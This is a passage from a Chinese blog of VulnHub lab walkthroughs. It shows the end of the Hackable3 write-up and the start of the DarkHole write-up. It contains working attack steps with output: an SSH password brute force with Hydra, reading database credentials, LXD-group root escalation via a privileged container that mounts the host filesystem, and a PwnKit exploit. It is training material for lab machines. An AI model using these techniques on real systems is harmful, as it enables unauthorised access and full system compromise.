class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ hydra -l jubiscleudo -P wordlist.txt ssh://192.168.2.13:22 -f<br>Hydra v9.5 (c) 2023 by van Hauser/THC &amp; David Maciejak - Please <span class="hljs-keyword">do</span> not use <span class="hljs-keyword">in</span> military or secret service organizations, or <span class="hljs-keyword">for</span> illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).<br><br>Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-11 15:49:11<br>[WARNING] Many SSH configurations <span class="hljs-built_in">limit</span> the number of parallel tasks, it is recommended to reduce the tasks: use -t 4<br>[DATA] max 16 tasks per 1 server, overall 16 tasks, 300 login tries (l:1/p:300), ~19 tries per task<br>[DATA] attacking ssh://192.168.2.13:22/<br>[22][ssh] host: 192.168.2.13   login: jubiscleudo   password: onlymy<br>[STATUS] attack finished <span class="hljs-keyword">for</span> 192.168.2.13 (valid pair found)<br>1 of 1 target successfully completed, 1 valid password found<br>Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-11 15:49:54<br></code></pre></td></tr></table></figure><ul><li>最后爆破出来，用户名：<code>jubiscleudo</code>，密码：<code>onlymy</code><br>（2）进行ssh登录<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/miao/vulnhub/hackable3]<br>└─$ ssh jubiscleudo@192.168.2.13<br>The authenticity of host <span class="hljs-string">&#x27;192.168.2.13 (192.168.2.13)&#x27;</span> can<span class="hljs-string">&#x27;t be established.</span><br><span class="hljs-string">ED25519 key fingerprint is SHA256:eKPnFiq8KwR3xWNP5ZL/aPJYYx+GZaCVrzrHIL4rem4.</span><br><span class="hljs-string">This key is not known by any other names.</span><br><span class="hljs-string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="hljs-string">Warning: Permanently added &#x27;</span>192.168.2.13<span class="hljs-string">&#x27; (ED25519) to the list of known hosts.</span><br><span class="hljs-string">jubiscleudo@192.168.2.13&#x27;</span>s password: <br>Welcome to Ubuntu 21.04 (GNU/Linux 5.11.0-16-generic x86_64)<br><br>Last login: Thu Apr 29 16:19:07 2021 from 192.168.2.106<br>jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">id</span><br>uid=1001(jubiscleudo) gid=1001(jubiscleudo) <span class="hljs-built_in">groups</span>=1001(jubiscleudo)<br></code></pre></td></tr></table></figure>（3）查看home目录，发现还存在一个用户<code>hackable_3</code><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">ls</span> -la /home<br>total 16<br>drwxr-xr-x  4 root        root        4096 Apr 29  2021 .<br>drwxr-xr-x 21 root        root        4096 Apr 29  2021 ..<br>drwxr-x---  4 hackable_3  hackable_3  4096 Feb 11 07:49 hackable_3<br>drwxr-x---  3 jubiscleudo jubiscleudo 4096 Apr 29  2021 jubiscleudo<br></code></pre></td></tr></table></figure>（4）查看<code>var/www/htmk</code>下面还存在一个隐藏文件，查看，找到一个用户名和密码<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">ls</span> -la /var/www/html<br>total 124<br>drwxr-xr-x 8 root     root      4096 Jun 30  2021 .<br>drwxr-xr-x 3 root     root      4096 Apr 29  2021 ..<br>-rw-r--r-- 1 www-data www-data 61259 Apr 21  2021 3.jpg<br>drwxr-xr-x 2 www-data www-data  4096 Apr 23  2021 backup<br>-r-xr-xr-x 1 www-data www-data   522 Apr 29  2021 .backup_config.php<br>drwxr-xr-x 2 www-data www-data  4096 Apr 29  2021 config<br>-rw-r--r-- 1 www-data www-data   507 Apr 23  2021 config.php<br>drwxr-xr-x 2 www-data www-data  4096 Apr 21  2021 css<br>-rw-r--r-- 1 www-data www-data 11327 Jun 30  2021 home.html<br>drwxr-xr-x 2 www-data www-data  4096 Apr 21  2021 imagens<br>-rw-r--r-- 1 www-data www-data  1095 Jun 30  2021 index.html<br>drwxr-xr-x 2 www-data www-data  4096 Apr 20  2021 js<br>drwxr-xr-x 5 www-data www-data  4096 Jun 30  2021 login_page<br>-rw-r--r-- 1 www-data www-data   487 Apr 23  2021 login.php<br>-rw-r--r-- 1 www-data www-data    33 Apr 21  2021 robots.txt<br>jubiscleudo@ubuntu20:~$ <span class="hljs-built_in">cat</span> /var/www/html/.backup_config.php <br>&lt;?php<br>/* Database credentials. Assuming you are running MySQL<br>server with default setting (user <span class="hljs-string">&#x27;root&#x27;</span> with no password) */<br>define(<span class="hljs-string">&#x27;DB_SERVER&#x27;</span>, <span class="hljs-string">&#x27;localhost&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_USERNAME&#x27;</span>, <span class="hljs-string">&#x27;hackable_3&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_PASSWORD&#x27;</span>, <span class="hljs-string">&#x27;TrOLLED_3&#x27;</span>);<br>define(<span class="hljs-string">&#x27;DB_NAME&#x27;</span>, <span class="hljs-string">&#x27;hackable&#x27;</span>);<br> <br>/* Attempt to connect to MySQL database */<br><span class="hljs-variable">$conexao</span> = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);<br><br><br>// Check connection<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$conexao</span> === <span class="hljs-literal">false</span>)&#123;<br>    die(<span class="hljs-string">&quot;ERROR: Could not connect. &quot;</span> . mysqli_connect_error());<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>&#125;<br>?&gt;<br>jubiscleudo@ubuntu20:~$ <br></code></pre></td></tr></table></figure>（5）切换用户，成功进入<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ su hackable_3<br>Password: <br>hackable_3@ubuntu20:/home/jubiscleudo$ <span class="hljs-built_in">id</span><br>uid=1000(hackable_3) gid=1000(hackable_3) <span class="hljs-built_in">groups</span>=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)<br></code></pre></td></tr></table></figure></li></ul><h1 id="提权-lxd"><a href="#提权-lxd" class="headerlink" title="提权-lxd"></a>提权-lxd</h1><p>（1）查看<code>hackable_3</code>用户的id时，发现存在一个用户组&#96;lxd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/home/jubiscleudo$ <span class="hljs-built_in">id</span><br>uid=1000(hackable_3) gid=1000(hackable_3) <span class="hljs-built_in">groups</span>=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)<br></code></pre></td></tr></table></figure><p>（2）验证是否具备提权条件，必修要存在这两个文件才可以进行提权</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/home/jubiscleudo$ <span class="hljs-built_in">which</span> lxd &amp;&amp; <span class="hljs-built_in">which</span> lxc<br>/snap/bin/lxd<br>/snap/bin/lxc<br></code></pre></td></tr></table></figure><ul><li>发现存在这两个文件，说明可以进行提权<br>（3）上传构造好的alpine镜像，并开启web服务<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python3 -m http.server 80<br></code></pre></td></tr></table></figure>（4）下载alpine镜像<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ wget http://192.168.2.4/alpine-v3.13-x86_64-20210218_0139.tar.gz<br>--2025-02-11 07:48:07--  http://192.168.2.4/alpine-v3.13-x86_64-20210218_0139.tar.gz<br>Connecting to 192.168.2.4:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 3259593 (3.1M) [application/gzip]<br>Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’<br><br>alpine-v3.13-x86_64-20210218_ 100%[==============================================&gt;]   3.11M  --.-KB/s    <span class="hljs-keyword">in</span> 0.02s   <br><br>2025-02-11 07:48:07 (161 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]<br></code></pre></td></tr></table></figure>（5）初始化镜像并导入镜像<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --<span class="hljs-built_in">alias</span> myimage<br>If this is your first <span class="hljs-keyword">time</span> running LXD on this machine, you should also run: lxd init<br>To start your first instance, try: lxc launch ubuntu:18.04<br><br>Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b<br>hackable_3@ubuntu20:/tmp$ lxd init <span class="hljs-comment">#默认选项</span><br></code></pre></td></tr></table></figure>（6）初始化镜像<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc init myimage ignite -c security.privileged=<span class="hljs-literal">true</span><br>Creating ignite<br></code></pre></td></tr></table></figure>（7）将宿主机目录挂至容器<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc config device add ignite mydevice disk <span class="hljs-built_in">source</span>=/ path=/mnt/root recursive=<span class="hljs-literal">true</span><br>Device mydevice added to ignite<br></code></pre></td></tr></table></figure>（8）启动容器<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hackable_3@ubuntu20:/tmp$ lxc start ignite<br></code></pre></td></tr></table></figure>（9）提权到<code>root</code>权限<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">ackable_3@ubuntu20:/tmp$ lxc <span class="hljs-built_in">exec</span> ignite /bin/sh<br>~ <span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root)<br></code></pre></td></tr></table></figure><strong>查看flag</strong><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs bash">~ <span class="hljs-comment"># cat /mnt/root/root/root.txt </span><br>░░█▀░░░░░░░░░░░▀▀███████░░░░<br>░░█▌░░░░░░░░░░░░░░░▀██████░░░<br>░█▌░░░░░░░░░░░░░░░░███████▌░░<br>░█░░░░░░░░░░░░░░░░░████████░░<br>▐▌░░░░░░░░░░░░░░░░░▀██████▌░░<br>░▌▄███▌░░░░▀████▄░░░░▀████▌░░<br>▐▀▀▄█▄░▌░░░▄██▄▄▄▀░░░░████▄▄░<br>▐░▀░░═▐░░░░░░══░░▀░░░░▐▀░▄▀▌▌<br>▐░░░░░▌░░░░░░░░░░░░░░░▀░▀░░▌▌<br>▐░░░▄▀░░░▀░▌░░░░░░░░░░░░▌█░▌▌<br>░▌░░▀▀▄▄▀▀▄▌▌░░░░░░░░░░▐░▀▐▐░<br>░▌░░▌░▄▄▄▄░░░▌░░░░░░░░▐░░▀▐░░<br>░█░▐▄██████▄░▐░░░░░░░░█▀▄▄▀░░<br>░▐░▌▌░░░░░░▀▀▄▐░░░░░░█▌░░░░░░<br>░░█░░▄▀▀▀▀▄░▄═╝▄░░░▄▀░▌░░░░░░<br>░░░▌▐░░░░░░▌░▀▀░░▄▀░░▐░░░░░░░<br>░░░▀▄░░░░░░░░░▄▀▀░░░░█░░░░░░░<br>░░░▄█▄▄▄▄▄▄▄▀▀░░░░░░░▌▌░░░░░░<br>░░▄▀▌▀▌░░░░░░░░░░░░░▄▀▀▄░░░░░<br>▄▀░░▌░▀▄░░░░░░░░░░▄▀░░▌░▀▄░░░<br>░░░░▌█▄▄▀▄░░░░░░▄▀░░░░▌░░░▌▄▄<br>░░░▄▐██████▄▄░▄▀░░▄▄▄▄▌░░░░▄░<br>░░▄▌████████▄▄▄███████▌░░░░░▄<br>░▄▀░██████████████████▌▀▄░░░░<br>▀░░░█████▀▀░░░▀███████░░░▀▄░░<br>░░░░▐█▀░░░▐░░░░░▀████▌░░░░▀▄░<br>░░░░░░▌░░░▐░░░░▐░░▀▀█░░░░░░░▀<br>░░░░░░▐░░░░▌░░░▐░░░░░▌░░░░░░░<br>░╔╗║░╔═╗░═╦═░░░░░╔╗░░╔═╗░╦═╗░<br>░║║║░║░║░░║░░░░░░╠╩╗░╠═╣░║░║░<br>░║╚╝░╚═╝░░║░░░░░░╚═╝░║░║░╩═╝░<br><br>invite-me: linkedin.com/in/eliastouguinho<br>~ <span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure></li></ul><h1 id="提权2-pwnkit"><a href="#提权2-pwnkit" class="headerlink" title="提权2-pwnkit"></a>提权2-pwnkit</h1><p>（1）使用脚本<code>linux-exploit-suggester.sh</code>查看哪些可以进行提权，找到一个pwnkit<br><img src="https://miaorj.oss-cn-chengdu.aliyuncs.com/obsidian/202502121110939.png"><br>（2）根据提示，找到利用的exp，但是执行后发现缺少<code>GLIBC_2.34</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:~$ ./exp /usr/bin/chfn<br>./exp: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34<span class="hljs-string">&#x27; not found (required by ./exp)</span><br></code></pre></td></tr></table></figure><p>（3）最后寻找到一个python的exp，成功进行提权<br>python脚本：<a href="https://github.com/joeammond/CVE-2021-4034">https://github.com/joeammond/CVE-2021-4034</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">jubiscleudo@ubuntu20:/tmp$ <span class="hljs-built_in">chmod</span> +x CVE-2021-4034.py<br>jubiscleudo@ubuntu20:/tmp$ python3 CVE-2021-4034.py<br>[+] Creating shared library <span class="hljs-keyword">for</span> exploit code.<br>[+] Calling execve()<br><span class="hljs-comment"># id</span><br>uid=0(root) gid=1001(jubiscleudo) <span class="hljs-built_in">groups</span>=1001(jubiscleudo)<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>（1）端口敲击<code>knock</code><br>端口敲门（Port Knocking）是一个巧妙的安全技术</p><ul><li>核心思想是：<br>  服务器的端口在默认情况下是“关着”的，只有<strong>按特定顺序访问</strong>一系列端口（即敲门），服务器才会临时打开关键端口，比如 SSH 的 22 端口。</li></ul><p>通过这种“动态开门”的方式，端口敲门让服务端口更隐秘，大幅降低了被恶意扫描和攻击的风险。</p><ul><li>端口敲门的工作流程如下：<ol><li>客户端按特定顺序访问几个指定的端口（敲门序列）。</li><li>服务端检测到正确的敲门序列后，触发规则，打开目标端口。</li><li>客户端完成访问后，可以再敲相反的顺序进行关闭端口。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─$ knock -h                              <br>usage: knock [options] &lt;host&gt; &lt;port[:proto]&gt; [port[:proto]] ...<br>options:<br>  -u, --udp            make all ports hits use UDP (default is TCP)<br>  -d, --delay &lt;t&gt;      <span class="hljs-built_in">wait</span> &lt;t&gt; milliseconds between port hits<br>  -4, --ipv4           Force usage of IPv4<br>  -6, --ipv6           Force usage of IPv6<br>  -v, --verbose        be verbose<br>  -V, --version        display version<br>  -h, --<span class="hljs-built_in">help</span>           this <span class="hljs-built_in">help</span><br><br>example:  knock myserver.example.com 123:tcp 456:udp 789:tcp<br></code></pre></td></tr></table></figure>（2）lxd提权<br>lxd用户组是Linux系统中一个特殊的用户组。该组的组成员均可以使用 Linux容器（LXD）。当前用户隶属于lxd用户组时，可以使用 lxc命令创建一个新的容器，再将宿主机文件系统挂载至容器中，即可进行查看宿主机敏感文件等操作。</li></ol></li></ul>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>提权-pwnkit</tag>
      
      <tag>敲击端口</tag>
      
      <tag>提权-lxd</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>DarkHole</title>
    <link href="/vulnhub/DarkHole/"/>
    <url>/vulnhub/DarkHole/</url>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="靶机说明"><a href="#靶机说明" class="headerlink" title="靶机说明"></a>靶机说明</h1><p><a href="https://www.vulnhub.com/entry/darkhole-1,724">https://www.vulnhub.com/entry/darkhole-1,724</a></p><h1 id="主机探测"><a href="#主机探测" class="headerlink" title="主机探测"></a>主机探测</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sn 192.168.1.0/24<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:45 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.1<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:C0:00:08 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.2<br>Host is up (0.00053s latency).<br>MAC Address: 00:50:56:E8:96:F1 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.00052s latency).<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.254<br>Host is up (0.00028s latency).<br>MAC Address: 00:50:56:EF:22:46 (VMware)<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.5<br>Host is up.<br>Nmap <span class="hljs-keyword">done</span>: 256 IP addresses (5 hosts up) scanned <span class="hljs-keyword">in</span> 2.04 seconds<br></code></pre></td></tr></table></figure><h1 id="nmap扫描"><a href="#nmap扫描" class="headerlink" title="nmap扫描"></a>nmap扫描</h1><p>（1）进行端口扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT --min-rate 10000 -p- 192.168.1.4 -oA nmapscan/ports                <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:46 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.0058s latency).<br>Not shown: 65533 closed tcp ports (conn-refused)<br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 1.75 seconds<br></code></pre></td></tr></table></figure><ul><li>开放端口22和80<br>（2）对端口细节进行扫描<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sT -sV -O --min-rate 10000 -p22,80 192.168.1.4 -oA nmapscan/detail<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:47 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.0029s latency).<br><br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)<br>80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device <span class="hljs-built_in">type</span>: general purpose<br>Running: Linux 4.X|5.X<br>OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5<br>OS details: Linux 4.15 - 5.8<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.63 seconds<br></code></pre></td></tr></table></figure></li></ul><p>（3）进行UDP扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap -sU -p22,80 192.168.1.4 -oA nmapscan/udp                   <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.00033s latency).<br><br>PORT   STATE  SERVICE<br>22/udp closed ssh<br>80/udp closed http<br>MAC Address: 00:0C:29:61:27:92 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 0.20 seconds<br><br></code></pre></td></tr></table></figure><p>（4）进行漏洞扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/miao/vulnhub/Darkhole]<br>└─$ <span class="hljs-built_in">sudo</span> nmap --script=vuln -p22,80 192.168.1.4 -oA nmapscan/vuln      <br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-08 19:48 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 192.168.1.4<br>Host is up (0.00049s latency).<br><br>PORT   STATE SERVICE<br>22/tcp open  ssh<br>80/tcp open  http<br>|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)<br>|_http-dombased-xss: Couldn<span class="hljs-string">&#x27;t find any DOM based XSS.</span><br><span class="hljs-string">| http-cookie-flags: </span><br><span class="hljs-string">|   /: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|       httponly flag not set</span><br><span class="hljs-string">|   /login.php: </span><br><span class="hljs-string">|     PHPSESSID: </span><br><span class="hljs-string">|_      httponly flag not set</span><br><span class="hljs-string">| http-csrf: </span><br><span class="hljs-string">| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=192.168.1.4</span><br><span class="hljs-string">|   Found the following possible CSRF vulnerabilities: </span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.1.4:80/login.php</span><br><span class="hljs-string">|     Form id: login__username</span><br><span class="hljs-string">|     Form action: login.php</span><br><span class="hljs-string">|     </span><br><span class="hljs-string">|     Path: http://192.168.1.4:80/register.php</span><br><span class="hljs-string">|     Form id: login__username</span><br><span class="hljs-string">|_    Form action: </span><br><span class="hljs-string">|_http-stored-xss: Couldn&#x27;</span>t find any stored XSS vulnerabilities.<br>| http-enum: <br>|   /login.php: Possible admin folder<br>|   /config/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>|   /css/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>|   /js/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>|_  /upload/: Potentially interesting directory w/ listing on <span class="hljs-string">&#x27;apache/2.4.41 (ubuntu)&#x27;</span><br>MAC Address: 00:0C:29:61:27:92 (VMware)<br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 31.21 seconds<br></code></pre></td></tr></table></figure><h1 id="web渗透"><a href="#web渗透" class="headerlink" title="web渗透"></a>web渗透</h1><h2 id="80端口渗透"><a href="#80端口渗透" class="headerlink" title="80端口渗透"></a>80端口渗透</h2><p>（1）进行目录扫描</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span 